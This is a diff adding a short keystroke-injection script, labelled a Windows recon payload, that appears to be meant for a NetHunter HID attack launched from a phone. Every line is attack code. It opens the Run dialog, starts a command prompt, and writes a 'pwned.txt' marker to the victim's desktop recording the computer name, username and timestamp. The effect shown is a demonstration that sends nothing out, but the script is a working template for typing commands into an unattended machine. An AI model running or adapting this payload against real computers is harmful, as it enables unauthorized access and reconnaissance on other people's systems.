@@ -1,0 +1,17 @@
+# Windows Recon Payload
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING echo "NetHunter Attack - Nothing Phone 1" > %USERPROFILE%\Desktop\pwned.txt
+ENTER
+STRING echo "System: %COMPUTERNAME%" >> %USERPROFILE%\Desktop\pwned.txt
+ENTER
+STRING echo "User: %USERNAME%" >> %USERPROFILE%\Desktop\pwned.txt
+ENTER
+STRING echo "Date: %date% %time%" >> %USERPROFILE%\Desktop\pwned.txt
+ENTER
+STRING exit
+ENTER
